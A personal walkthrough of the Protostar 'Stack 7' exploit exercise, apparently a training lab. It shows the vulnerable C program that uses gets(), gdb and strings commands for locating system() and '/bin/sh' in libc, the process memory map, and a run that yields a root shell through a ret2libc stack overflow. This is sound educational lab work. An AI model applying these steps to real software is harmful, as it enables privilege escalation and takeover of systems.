
___________________________________________ EXPLOIT EXERCISES _________________________________________
			
========= Abhinav Thakur
========= compilepeace@gmail.com


######### PROTOSTAR

                                  =-=-=-=-=-=   STACK - 7   =-=-=-=-=




1.	First I log into the virtual machine with
		username : user
		password : user



2.	Source code provided is - 


		#include <stdlib.h>
		#include <unistd.h>
		#include <stdio.h>
		#include <string.h>

		char *getpath()
		{
		  char buffer[64];
		  unsigned int ret;

		  printf("input path please: "); fflush(stdout);

		  gets(buffer);

		  ret = __builtin_return_address(0);

		  if((ret & 0xb0000000) == 0xb0000000) {
		      printf("bzzzt (%p)\n", ret);
		      _exit(1);
		  }

		  printf("got path %s\n", buffer);
		  return strdup(buffer);
		}

		int main(int argc, char **argv)
		{
		  getpath();



		}



3.	My first approach was to put our shellocode in the buffer along with NOPS ("\x90") and then
	overwriting the getpath()'s saved eip with the address of the 'ret' instruction of either 
	main() or getpath(), both of which would lead to poping of a DWORD (4 bytes) from the stack
	(esp) (which is just next to getpath()'s saved eip) in which I overwrote an address pointing
	to the shellcode or a place in the middle of buffer (filled with NOPS and shellcode).
	This resulted in a SIGSEGV or Illegal instruction.
	However, when I used "\xcc" (INT 3) instruction it lead to execution of this instruction 
	and a - SIGTRAP was encountered.
	This should have lead to the arbitary code execution but unfortunately I was not able to 
	figure out the solution to this probleum. So I saved the file as 'exploit_stack7_incomplete.py'
	and will debug it later.



4.	My next move is the ret2libc method, 
	Here I need to prepare a stack frame such that the sequence on stack (from lower to higher 
	memory address) i

		1.	Address to <__libc_system>
		2.	An address to return to after executing system() (is of no concern to us until we 
			want to construct a ROP chain)
		3.	Address of "/bin/sh" which will be present in libc.


5.	First we find address of system(). This can be done with the help of gdb -
	(gdb) print system
	$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>

	Second we put 4 A's in return pointer of this stack frame (which is being constructed)

	Third, we find address of string "/bin/sh" from /lib/libc-2.11.2.so by using 
	'strings' program in linux (which extracts all the strings of at least 3 readable chars
	long from an executable).

		$ strings -t x /lib/libc-2.11.2.so | grep "/bin/sh"
		 11f3bf /bin/sh

	This value - 0x11f3bf is actually an offset to "/bin/sh" from the address to which the
	/lib/libc-2.11.2.so will be loaded in program's address space. 

		(gdb) info proc map
		process 4277
		cmdline = '/opt/protostar/bin/stack7'
		cwd = '/opt/protostar/bin'
		exe = '/opt/protostar/bin/stack7'
		Mapped address spaces:

		        Start Addr   End Addr       Size     Offset objfile
		         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack7
		         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack7
		         0x804a000  0x806b000    0x21000          0           [heap]
		        0xb7e96000 0xb7e97000     0x1000          0
		        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
		        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
		        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
		        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
		        0xb7fd9000 0xb7fdc000     0x3000          0
		        0xb7fde000 0xb7fe2000     0x4000          0
		        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
		        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
		        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
		        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
		        0xbffeb000 0xc0000000    0x15000          0           [stack]

	0xb7e97000 is the address where /lib/libc-2.11.2.so will be loaded. Now adding the offset
	0x11f3bf will give the exact address of string "/bin/sh". We can verify it by examining
	the data at (0xb7e97000 + 0x11f3bf) as a string!	
	So final address of string "/bin/sh" is 0xb7fb63bf.
	Now have a look at the 'exploit_stack7.py' prepared with love and aggression towards 
	the stack segment.

	

6.	Run the script -
	
		$ python exploit_stack7.py > input_file
		$ cat input_file - | /opt/protostar/bin/stack7
		input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAD▒▒▒AAAA▒c▒

		whoami
		root


	We successfully pawned the machine
	cheers,
	